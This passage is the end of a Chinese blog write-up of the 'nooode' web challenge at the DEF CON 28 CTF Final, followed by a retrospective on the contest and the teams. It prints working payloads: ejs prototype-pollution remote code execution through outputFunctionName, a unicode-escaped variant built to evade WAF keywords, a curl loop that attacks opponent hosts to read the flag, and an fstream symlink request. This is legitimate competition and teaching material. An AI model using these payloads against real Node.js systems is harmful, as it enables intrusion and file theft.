  <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s2>&#34;error&#34;</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>所以我们需要一个报错来触发这个<code>res.render</code>，而我们传入的<code>"path":{"type":"string","default":"/foo"}</code>就起到了污染之前的 path 让 nodejs 读取到了一个不存在的文件引起报错，进而进入错误处理来实现 ejs 的命令执行。</p>
<p>所以之前对于 flat 的原型链污染也可以根据同样的原理进行 RCE ：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;__proto__.outputFunctionName&#34;</span><span class=p>:</span> <span class=s2>&#34;a=1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;touch /tmp/b&#39;)//&#34;</span><span class=p>,</span><span class=nt>&#34;__proto__.path&#34;</span><span class=p>:</span> <span class=s2>&#34;/foo&#34;</span><span class=p>}</span>
</code></pre></div><p>还有一些改变就是利用编码来绕过一些 waf 关键字：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;$schema&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;outputFunctionName&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;string&#34;</span><span class=p>,</span><span class=nt>&#34;default&#34;</span><span class=p>:</span><span class=s2>&#34;x;return eval(`\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\\u002e\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0028\\u0060\\u0066\\u0073\\u0060\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0046\\u0069\\u006c\\u0065\\u0053\\u0079\\u006e\\u0063\\u0028\\u0060\\u002f\\u0066\\u006c\\u0060\\u002b\\u0060\\u0061\\u0067\\u0060\\u0029\\u002e\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0060\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0060\\u0029`);//x&#34;</span><span class=p>},</span><span class=nt>&#34;path&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;string&#34;</span><span class=p>,</span><span class=nt>&#34;default&#34;</span><span class=p>:</span><span class=s2>&#34;/foo&#34;</span><span class=p>}}}}}}</span>
</code></pre></div><p>赛后跟 /bin/tw 的选手交流了一下，他们的 payload 到后面仍然可以打好几个队，于是去要了一份 POC ，如下，也是大概类似的一个写法：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>curl http://10.13.37.<span class=nv>$i</span>:14017/config/validated/json-schema/validate -H <span class=s1>&#39;content-type: application/json&#39;</span> --data <span class=s1>&#39;{&#34;$schema&#34;:{&#34;type&#34;:&#34;object&#34;,&#34;properties&#34;:{&#34;__proto__&#34;:{&#34;type&#34;:&#34;object&#34;,&#34;properties&#34;:{&#34;outputFunctionName&#34;:{&#34;type&#34;:&#34;string&#34;,&#34;default&#34;:&#34;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&#34;},&#34;path&#34;:{&#34;type&#34;:&#34;string&#34;,&#34;default&#34;:&#34;/foo&#34;}}}}}}&#39;</span>
</code></pre></div><h3 id=fstream>fstream</h3>
<p>还有一个是我们队大师傅找的</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/config/validated/fstream/Writer</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:4017</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>77</span>

<span class=p>{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;SymbolicLink&#34;</span><span class=p>,</span><span class=nt>&#34;linkpath&#34;</span><span class=p>:</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span><span class=nt>&#34;path&#34;</span><span class=p>:</span><span class=s2>&#34;public/stylesheets/11.png&#34;</span><span class=p>}</span>
</code></pre></div><p>这个也没什么好分析的，文档看一看：https://github.com/npm/fstream 就好了，这里当时我们貌似还捣鼓了一会 json 传参啥的，但是后来试了一下<code>application/x-www-form-urlencoded</code> 也可以</p>
<h2 id=conclusion>Conclusion</h2>
<h3 id=about-the-web>About The Web</h3>
<p>这次 Web 当时比赛我们也都在吐槽，因为这个 Web 题当时觉得并不是很好，简直就直接给了一个后门，而且确实整个比赛弄起来不仅是 Web 这个后门似的洞，还有其他题目听其他大师傅吐槽也都是找后门的题目。</p>
<p>后面看了出题人相关的讲述，讲述视频地址：<a class=link href="https://www.youtube.com/watch?v=g2BDz6yHcbo" target=_blank rel=noopener>nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003</a> ，后来觉得吧，确实也还过得去，这个题目增加了一些多元化的设计，因为引入了很多 lib ，所以有很多姿势可以去尝试，可以去挖，比赛途中那次重置应该也就是加强了 checker ，也看得出 OOO 在这方面还是尽力了。（如果你删掉题目给的 node_modules ，然后重新 install 的话，会发现官方给的多出一个 vm2 ，当时我们就在想难不成还可能是 vm2 逃逸？但是后面找了一会没找到就放弃了这条路。（（因为我们当时想万一 OOO 还别有用心地再放一个后门在 node_modules 呢？毕竟 Backdooor CTF</p>
<p>这次虽然简单，但是确实也让我增加了一些对于如何设计 AWD Web 题目的思考，包括 @Zach Wade 也有类似的想法:</p>
<blockquote>
<p>​ Although I might sound frustrated by this, I think it’s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.</p>
</blockquote>
<h3 id=something-else>Something Else</h3>
<p>还有一些比较有意思的事就是，A0E 的同学说，我们队的大师傅手绕 A0E 如果再多打一轮，那么这次的结果就不一样了，也因为这个保证了与 PPP 高出的两分的差距。（这难道不值得一顿饭吗？</p>
<p>根据一些现有的报道，以及向一些 A0E 的同学考证一些问题，比如他们真的是很早就准备了吗？真的有对每个人分特性，每个人擅长什么吗等等问题，都得到了肯定的回答，不得不佩服 A0E 的团队管理协作能力 orz 而且根据他们结束当天的合照来看估计也得有50多人左右吧。（据说 Samurai 参赛人数达到了恐怖的150人</p>
<p>虽然 PPP 表示自己 &ldquo;Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.&rdquo; ，但是也展示出了一如既往对 DEFCON 的统治力。</p>
<p>自己在比赛的时候由于自身能力较差以及第一次跟大师傅们配合，当时比赛配合得不是相当的好，可能导致了一些失分，如果以后还有机会，希望自己提升能力的同时，也能尽量提高一些合作的能力。</p>
<p>总的来说，泡面、外卖很好吃，公司办公椅很舒服，“网管”运维选手非常给力，大师傅们都非常非常的厉害。今年对一开始的 KOH 以及最后的 Web 做了一点点微小的贡献，如果以后有机会的话希望能做到更大的贡献叭！</p>
<p>再次恭喜 A*0*E 拿到 DEFCON 28 CTF Final 冠军！</p>
<h1 id=others-notes>Others Notes</h1>
<p>PPP &ndash; Zach Wade 的回顾： <a class=link href=https://dttw.tech/posts/Skww4fzGP target=_blank rel=noopener>Kernel Panic: A DEF CON 2020 Retrospective</a></p>
<p>r3kapig &ndash; Y1ng 的回顾：<a class=link href=https://www.gem-love.com/ctf/2558.html target=_blank rel=noopener>DEFCON 28 CTF Final Safe Mode参赛记录</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/>
<div class=article-details>
<h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2>
</div>
</a>
</article>
<article>
<a href=/2022/01/08/2022-01-08-TheEndOfLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2>
</div>
</a>
</article>
<article>
<a href=/2021/12/27/2021-12-20-ANewNovelLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#simple-introduction>Simple Introduction</a></li>
<li><a href=#time>Time</a></li>
<li><a href=#stealth-ports>Stealth Ports</a></li>
<li><a href=#before-shift-1>Before Shift 1</a></li>
<li><a href=#shift-1>Shift 1</a></li>
<li><a href=#shift-2--shift-3>Shift 2 & Shift 3</a></li>
<li><a href=#shift-4>Shift 4</a></li>
<li><a href=#nooode>Nooode</a>
<ol>
<li><a href=#require>Require</a></li>
<li><a href=#vm>vm</a></li>
<li><a href=#flat>flat</a></li>
<li><a href=#jsonlint>Jsonlint</a></li>
<li><a href=#json-schema>json-schema</a></li>
<li><a href=#fstream>fstream</a></li>
</ol>
</li>
<li><a href=#conclusion>Conclusion</a>
<ol>
<li><a href=#about-the-web>About The Web</a></li>
<li><a href=#something-else>Something Else</a></li>
</ol>
</li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>